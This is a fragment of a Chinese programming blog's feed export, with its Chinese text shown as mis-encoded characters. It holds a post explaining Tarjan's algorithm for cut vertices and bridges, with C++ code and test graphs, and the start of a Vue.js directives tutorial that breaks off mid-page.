    <content><![CDATA[<h2 id="Tarjan"><a href="#Tarjan" class="headerlink" title="Tarjan"></a>Tarjan</h2><p>ç¾å›½è‘—åç§‘å­¦å®¶ï¼Œå…¨å <code>Robert Tarjan</code>ï¼Œåœ¨å›¾è®ºå’Œæ•°æ®ç»“æ„æ–¹é¢æœ‰ç€é‡è¦çªå‡ºè´¡çŒ®ã€‚æœ¬æ–‡æ‰€ä»‹ç»çš„ç®—æ³•æ˜¯æ±‚è§£æœ‰å‘å›¾å¼ºè¿é€šåˆ†é‡çš„ç®—æ³•ï¼Œå®ƒèƒ½åšåˆ°çº¿æ€§æ—¶é—´çš„å¤æ‚åº¦ã€‚ç®—æ³•ç»´æŠ¤ä¸¤ä¸ªæ•°ç»„<a id="more"></a></p>
<ul>
<li><code>fdn[]</code>ï¼šåœ¨<code>DFS</code>ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹è¢«è®¿é—®çš„æ¬¡åºï¼Œå³æ—¶é—´æˆ³ã€‚</li>
<li><code>low[]</code>ï¼šåœ¨<code>DFS</code>ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¸é€šè¿‡ä¸çˆ¶äº²èŠ‚ç‚¹ç›´æ¥ç›¸è¿çš„è¾¹è€Œè®¿é—®çš„æœ€æ—©æ—¶é—´æˆ³ã€‚</li>
</ul>
<p>åˆ©ç”¨è¿™ä¸¤ä¸ªæ•°ç»„å¯ä»¥æ±‚è§£è®¸å¤šé—®é¢˜ï¼Œä¾‹å¦‚æ±‚å‰²ç‚¹ã€å‰²è¾¹ã€å¼ºè¿é€šåˆ†é‡ä¸ªæ•°ç­‰ã€‚</p>
<p>å½“ä¸€ä¸ªç‚¹æ˜¯å‰²ç‚¹ï¼Œæ»¡è¶³ä¸‹é¢çš„æ¡ä»¶æ—¶æˆç«‹ï¼š</p>
<ul>
<li>å¦‚æœèŠ‚ç‚¹<code>u</code>æ˜¯æ€»çš„<code>DFS</code>æ ‘çš„æ ¹ï¼Œè¯¥èŠ‚ç‚¹<code>u</code>æœ‰å¤šäº1ä¸ªçš„å­æ ‘ã€‚</li>
<li>å¦‚æœèŠ‚ç‚¹<code>u</code>ä¸æ˜¯æ€»çš„<code>DFS</code>æ ‘çš„æ ¹ï¼Œè¯¥èŠ‚ç‚¹<code>u</code>å­˜åœ¨ä¸€é¢—å­æ ‘ï¼Œå­æ ‘çš„æ ¹èŠ‚ç‚¹ä¸º<code>v</code>ï¼Œä¸”<code>dfn[u]&lt;=low[v]</code></li>
</ul>
<p>è€Œä¸€æ¡è¾¹<code>(u,v)</code>æ˜¯å‰²è¾¹ï¼Œå½“ä¸”ä»…å½“è¿™ä¸¤ç‚¹ä¹‹é—´æ²¡æœ‰é‡è¾¹ï¼Œè€Œä¸”<code>dfn[u] &lt; low[v]</code></p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 20001</span></span><br><span class="line"><span class="comment">// å‰²è¾¹é›†åˆ</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; edgeCut;</span><br><span class="line"><span class="comment">// vertexs[] é‚»æ¥è¡¨ verCut å‰²ç‚¹é›†åˆ</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vertexs[MAXN], verCut, item(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> dfn[MAXN], low[MAXN];</span><br><span class="line"><span class="keyword">int</span> n, m, countTime = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan</span><span class="params">(<span class="keyword">int</span> nowVertex, <span class="keyword">int</span> father = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">    dfn[nowVertex] = low[nowVertex] = countTime++;</span><br><span class="line">    <span class="keyword">int</span> child, childTree = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vertexs[nowVertex].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        child = vertexs[nowVertex][i];</span><br><span class="line">        <span class="keyword">if</span> (child == father) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[child]) &#123;</span><br><span class="line">            childTree++;</span><br><span class="line">            Tarjan(child, nowVertex);</span><br><span class="line">            <span class="keyword">if</span> (dfn[nowVertex] &lt;= low[child]) flag = <span class="literal">true</span>;</span><br><span class="line">            low[nowVertex] = <span class="built_in">min</span>(low[nowVertex], low[child]);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            low[nowVertex] = <span class="built_in">min</span>(low[nowVertex], dfn[child]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((!father &amp;&amp; childTree &gt; <span class="number">1</span>) || (father &amp;&amp; flag))</span><br><span class="line">        verCut.push_back(nowVertex);</span><br><span class="line">    <span class="keyword">if</span> (father &amp;&amp; low[nowVertex] &gt; dfn[father]) &#123;</span><br><span class="line">        item[<span class="number">0</span>] = father;</span><br><span class="line">        item[<span class="number">1</span>] = nowVertex;</span><br><span class="line">        edgeCut.push_back(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dfn, <span class="number">0</span>, <span class="keyword">sizeof</span>(dfn));</span><br><span class="line">    <span class="keyword">int</span> u, v;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        vertexs[u].push_back(v);</span><br><span class="line">        vertexs[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">if</span> (!dfn[i]) Tarjan(i);</span><br><span class="line">    <span class="comment">/* for (int i = 1; i &lt;= n; i++)</span></span><br><span class="line"><span class="comment">        printf("%d : %d ---- %d \n", i, dfn[i], low[i]); */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"verCut's is : %d\n"</span>, verCut.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (verCut.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sort(verCut.<span class="built_in">begin</span>(), verCut.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; verCut.<span class="built_in">size</span>(); i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, verCut[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\ndgeCut's is : %d\n"</span>, edgeCut.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (edgeCut.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; edgeCut.<span class="built_in">size</span>(); i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d---%d\n"</span>, edgeCut[i][<span class="number">0</span>], edgeCut[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6 7</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8 7</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8 8</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">2 3</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">6 7</span></span><br><span class="line"><span class="comment">7 8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6 6</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">2 3</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>é€’å½’</tag>
      </tags>
  </entry>
  <entry>
    <title>VueæŒ‡ä»¤</title>
    <url>/2020/03/21/Vue%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h2><p>è®¾ç½®æ ‡ç­¾çš„æ–‡æœ¬å€¼ï¼ˆtextContentï¼‰</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">"hello"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<a id="more"></a>

  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">"message"</span>&gt;</span>æ ‡é¢˜<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;æ ‡é¢˜<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  æˆ‘ä»¬ä¼šå‘ç°ï¼Œä½¿ç”¨v-textè®¾ç½®æ–‡æœ¬çš„è¯ï¼Œæ ‡ç­¾å†…éƒ¨çš„æ–‡æœ¬å€¼ä¼šè¢«å®Œå…¨åœ°è¦†ç›–</p>
<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200316/wFn0pr9f1dW3.png" alt></p>
<h2 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h2><p>è®¾ç½®æ ‡ç­¾åœ°innerHTML</p>
<p>  <strong>æ³¨æ„</strong>å½“v-htmlçš„å€¼æ˜¯æ™®é€šçš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œv-htmlå’Œv-textçš„ç”¨æ³•æ²¡æœ‰åŒºåˆ«ï¼Œä½†å½“v-htmlçš„å€¼æ˜¯ä¸€ä¸ªæ ‡ç­¾çš„è¯­æ³•æ—¶ï¼Œè¿™äºŒè€…çš„ç”¨æ³•å°±æœ‰äº†åŒºåˆ«</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span> = <span class="string">"content1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span> = <span class="string">"content1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span> = <span class="string">"content2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span> = <span class="string">"content2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        content1: <span class="string">"hello"</span>,</span><br><span class="line">        content2: <span class="string">"&lt;a href='https://yalexin.gitee.io/'&gt;è¶…é“¾æ¥&lt;/a&gt;"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/SPaHMAOyWjC7.png" alt="å›¾ç‰‡"></p>
<p>  å¯ä»¥å‘ç°ï¼Œv-htmlæˆåŠŸåœ°æ¸²æŸ“æˆäº†æ ‡ç­¾ï¼Œä½†æ˜¯å‰ææ˜¯v-htmlæ‰€åœ¨èŠ‚ç‚¹èƒ½å¤Ÿæ‹¥æœ‰å­èŠ‚ç‚¹ã€‚</p>
<h2 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h2><p> ä¸ºå…ƒç´ ç»‘å®šäº‹ä»¶</p>
<p>  æˆ‘ä»¬å¯ä»¥ä»å®˜æ–¹çš„<a href="https://developer.mozilla.org/zh-CN/docs/Web/Events" target="_blank" rel="noopener">æ–‡æ¡£</a>ä¸­å¯ä»¥å¾—çŸ¥ï¼ŒVueæ”¯æŒçš„äº‹ä»¶éå¸¸å¤šï¼Œç”¨æ³•éƒ½æ˜¯ç±»ä¼¼ä¸‹é¢çš„æƒ…å†µ</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æ ¼å¼æ˜¯   v-on:+äº‹ä»¶å+="éœ€è¦ç»‘å®šçš„æ–¹æ³•" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">v-on:click</span>=<span class="string">"demo1_fun"</span> <span class="attr">value</span>=<span class="string">"äº‹ä»¶ç»‘å®š-å…¨å†™"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æ ¼å¼æ˜¯   @+äº‹ä»¶å+="éœ€è¦ç»‘å®šçš„æ–¹æ³•" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> @<span class="attr">click</span>=<span class="string">"demo2_fun"</span> <span class="attr">value</span>=<span class="string">"äº‹ä»¶ç»‘å®š-ç®€å†™"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el: &quot;#app&quot;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        demo1_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo1_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        demo2_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo2_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        demo3_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo3_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  å‡å¦‚éœ€è¦ä¼ é€’å‚æ•°ï¼Œåªéœ€è¦v-onå¤„æä¾›å®å‚å³å¯</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">@click="demo2_fun(p1,p2,p3,...)"</span><br></pre></td></tr></table></figure>

<p>  è¯¥æŒ‡ä»¤è¿˜å¯ä»¥é…åˆäº‹ä»¶ä¿®é¥°ç¬¦æ¥ä½¿ç”¨ï¼Œä¸€ä¸ªç®€å•çš„ä¾‹å­å°±æ˜¯ï¼Œæˆ‘ä»¬å¸Œæœ›æŒ‰ä¸‹å›è½¦é”®æ—¶è§¦å‘äº‹ä»¶ï¼š</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> @<span class="attr">keydown.enter</span>=<span class="string">"do_sh"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  å…³äºæ›´å¤šçš„ç”¨æ³•ï¼Œå¯ä»¥å‚ç…§å®˜æ–¹<a href="[https://cn.vuejs.org/v2/guide/events.html#%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6](https://cn.vuejs.org/v2/guide/events.html#äº‹ä»¶ä¿®é¥°ç¬¦)">æ–‡æ¡£</a></p>
<p>  äº‹ä»¶åä¸éœ€è¦å†™<strong>on</strong>ï¼Œç»‘å®šçš„æ–¹æ³•å®šä¹‰åœ¨<strong>methods</strong>å±æ€§ä¸­ï¼Œè€Œä¸”æ–¹æ³•å†…éƒ¨é€šè¿‡<strong>this</strong>å…³é”®å­—å¯ä»¥è®¿é—®å®šä¹‰åœ¨<strong>data</strong>ä¸­çš„æ•°æ®ã€‚</p>
<h2 id="v-showï¼š"><a href="#v-showï¼š" class="headerlink" title="v-showï¼š"></a>v-showï¼š</h2><p>æ ¹æ®çœŸå‡åˆ‡æ¢å…ƒç´ çš„æ˜¾ç¤ºçŠ¶æ€ï¼ŒåŸç†æ˜¯ä¿®æ”¹å…ƒç´ çš„displayï¼Œå®ç°æ˜¾ç¤ºå’Œéšè—ï¼ŒæŒ‡ä»¤çš„å€¼æœ€ç»ˆè¢«è§£æä¸ºå¸ƒå°”å€¼(trueæ˜¾ç¤ºï¼Œfalseéšè—)ã€‚</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change_show"</span>&gt;</span>click-me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">"isShow"</span>&gt;</span>è¿™æ˜¯ä¸€æ®µæµ‹è¯•çš„æ–‡å­—<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isShow: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        change_show: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.isShow = !<span class="keyword">this</span>.isShow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<h2 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h2><p>æ ¹æ®çœŸå‡åˆ‡æ¢å…ƒç´ çš„æ˜¾ç¤ºçŠ¶æ€ï¼ŒåŸç†æ˜¯æ“çºµdomå…ƒç´ æ¥åˆ‡æ¢æ˜¾ç¤ºçŠ¶æ€ï¼Œæ•ˆæœè·Ÿv-showæ˜¯ä¸€æ ·çš„ã€‚</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change_show"</span>&gt;</span>click-me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">"isIf"</span>&gt;</span>è¿™æ˜¯ä¸€æ®µæµ‹è¯•çš„æ–‡å­—<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isIf: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        change_show: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.isIf = !<span class="keyword">this</span>.isIf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/BRp7PP313Lue.png" alt="å›¾ç‰‡"></p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/3zny7F5J6mgD.png" alt="å›¾ç‰‡"></p>
<pre><code>å³å½“v-ifçš„å€¼æ˜¯trueæ—¶ï¼Œè¯¥å…ƒç´ åœ¨å­˜åœ¨äºdivæ ‡ç­¾ä¸­ï¼Œå¦åˆ™å°†å…ƒç´ ç§»é™¤ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•è¿›è¡Œé€‰æ‹©ï¼Ÿ ä¸€èˆ¬æ¥è¯´ï¼Œ v-if æœ‰    æ›´é«˜çš„åˆ‡æ¢å¼€é”€ï¼Œè€Œ v-show æœ‰æ›´é«˜çš„åˆå§‹æ¸²æŸ“å¼€é”€ã€‚å› æ­¤ï¼Œå¦‚æœéœ€è¦éå¸¸é¢‘ç¹åœ°åˆ‡æ¢ï¼Œåˆ™ä½¿ç”¨ v-show è¾ƒå¥½ï¼›    å¦‚æœåœ¨è¿è¡Œæ—¶æ¡ä»¶ä¸å¤ªå¯èƒ½æ”¹å˜ï¼Œåˆ™ä½¿ç”¨ v-if è¾ƒå¥½ã€‚ </code></pre><h2 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h2><p>ä¸ºå…ƒç´ ç»‘å®šå±æ€§å€¼</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">"img_src"</span> <span class="attr">v-bind:title</span>=<span class="string">"title1"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ç®€å†™ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"img_src"</span> <span class="attr">:title</span>=<span class="string">"title2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isShow: <span class="literal">false</span>,</span><br><span class="line">        img_src:<span class="string">"../study/images/2.jpg"</span>,</span><br><span class="line">        title1:<span class="string">"å›¾ç‰‡ä¸€"</span>,</span><br><span class="line">        title2:<span class="string">"å›¾ç‰‡äºŒ"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><p>æ ¹æ®æ•°æ®æºç”Ÿæˆåˆ—è¡¨ç»“æ„ï¼Œè¯­æ³•æ˜¯(item,index) in æ•°æ®æºï¼š</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in demo_array"</span>&gt;</span></span><br><span class="line">            æ¯å¤©åšçš„äº‹æƒ…:&#123;&#123;item&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        demo_array:[<span class="string">"å†™bug"</span>,<span class="string">"æŸ¥bug"</span>,<span class="string">"æ”¹bug"</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200323/KILg1Tt8tV9r.png" alt="å›¾ç‰‡"></p>
<p>  v-forä¸ä»…ä»…å¯ä»¥æ”¾è¿›<code>li</code>æ ‡ç­¾ä¸­ï¼Œè¿˜å¯ä»¥æ”¾è¿›å…¶ä»–ä¸­ï¼Œè€Œä¸”æ•°æ®æºä¹Ÿä¸ä»…é™äºæ™®é€šæ•°ç»„ï¼Œå¯¹è±¡æ€§æ•°ç»„ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¦‚ï¼š</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">"item in students"</span>&gt;</span></span><br><span class="line">            å­¦ç”Ÿå§“åï¼š&#123;&#123;item.name&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 